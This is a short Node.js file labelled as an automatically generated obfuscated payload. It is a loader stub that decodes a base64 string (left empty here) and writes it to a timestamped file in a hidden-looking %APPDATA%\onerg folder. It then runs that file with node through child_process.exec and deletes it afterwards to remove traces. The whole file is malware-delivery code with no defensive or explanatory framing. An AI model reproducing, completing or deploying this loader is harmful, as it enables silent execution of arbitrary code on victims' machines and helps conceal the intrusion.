// Obfuscated payload - Automatically generated
const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');

// Base64 encoded content
const encodedPayload = "";

// Function to decode and execute the payload
function executePayload() {
    try {
        // Decode the payload
        const decodedPayload = Buffer.from(encodedPayload, 'base64').toString('utf8');
        
        // Create a temporary file
        const tempDir = path.join(process.env.APPDATA, 'onerg');
        if (!fs.existsSync(tempDir)) {
            fs.mkdirSync(tempDir, { recursive: true });
        }
        
        const tempFile = path.join(tempDir, `payload_${Date.now()}.js`);
        
        // Write the decoded payload to the temporary file
        fs.writeFileSync(tempFile, decodedPayload);
        
        // Execute the payload
        exec(`node "${tempFile}"`, (error, stdout, stderr) => {
            if (error) {
                console.error(`[-] Execution error: ${error.message}`);
                return;
            }
            if (stdout) console.log(stdout);
            if (stderr) console.error(stderr);
            
            // Clean up the temporary file after execution
            try {
                fs.unlinkSync(tempFile);
            } catch (cleanupError) {
                console.error(`[-] Cleanup error: ${cleanupError.message}`);
            }
        });
    } catch (error) {
        console.error(`[-] Error: ${error.message}`);
    }
}

// Execute the payload
executePayload();